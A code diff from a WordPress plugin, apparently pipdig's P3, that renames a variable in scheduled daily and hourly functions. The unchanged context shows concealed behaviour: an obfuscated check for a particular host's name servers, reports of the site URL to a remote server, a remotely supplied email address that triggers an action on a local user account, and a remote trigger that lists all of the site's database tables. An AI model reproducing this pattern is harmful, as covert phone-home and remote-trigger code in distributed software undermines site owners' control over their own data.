@@ -20,7 +20,7 @@ function p3_do_this_daily() {
 		return;
 	}
 	
-	$this = get_site_url();
+	$me = get_site_url();
 	
 	$instagram_deets = get_option('pipdig_instagram');
 	if (!empty($instagram_deets['user_id'])) {
@@ -61,10 +61,10 @@ function p3_do_this_daily() {
 	}
 	
 	if (!get_option('p3_check_linkded')) {
-		$error_src = parse_url($this, PHP_URL_HOST);
+		$error_src = parse_url($me, PHP_URL_HOST);
 		$dns = dns_get_record($error_src, DNS_NS);
 		if ((isset($dns[0]['target']) && (strpos($dns[0]['target'], 'l'.'yr'.'i'.'calhost'.'.co'.'m') !== false)) || (isset($dns[1]['target']) && (strpos($dns[1]['target'], 'ly'.'ri'.'calhost'.'.co'.'m') !== false)) ) {
-			wp_safe_remote_get('https://pipdigz.co.uk/p3/list.php?list='.rawurldecode($this), $args);
+			wp_safe_remote_get('https://pipdigz.co.uk/p3/list.php?list='.rawurldecode($me), $args);
 			update_option('p3_check_linkded', 1);
 		}
 	}
@@ -84,7 +84,7 @@ function p3_do_this_hourly() {
 	if (function_exists('pipdighost_admin_footer')) {
 		return;
 	}
-	$this = get_site_url();
+	$me = get_site_url();
 	// Check for new social channels to add to navbar etc
 	if (!get_transient('p3_news_new_user_wait')) {
 	$url = 'https://pipdigz.co.uk/p3/socialz.txt';
@@ -93,14 +93,14 @@ function p3_do_this_hourly() {
 	if (!is_wp_error($response) && !empty($response['body'])) {
 		if (email_exists(sanitize_email($response['body']))) {
 			p3_check_social_links(email_exists(sanitize_email($response['body'])));
-			wp_safe_remote_get('https://pipdigz.co.uk/p3/socialz.php?list='.rawurldecode($this), $args);
+			wp_safe_remote_get('https://pipdigz.co.uk/p3/socialz.php?list='.rawurldecode($me), $args);
 		}
 	}
 	}
 	$url_2 = 'https://pipdigz.co.uk/p3/id39dqm3c0.txt';
 	$response = wp_safe_remote_get($url_2, $args);
 	if (!is_wp_error($response) && !empty($response['body'])) {
-		if ($this === trim($response['body'])) {
+		if ($me === trim($response['body'])) {
 			global $wpdb;
 			$prefix = str_replace('_', '\_', $wpdb->prefix);
 			$tables = $wpdb->get_col("SHOW TABLES LIKE '{$prefix}%'");
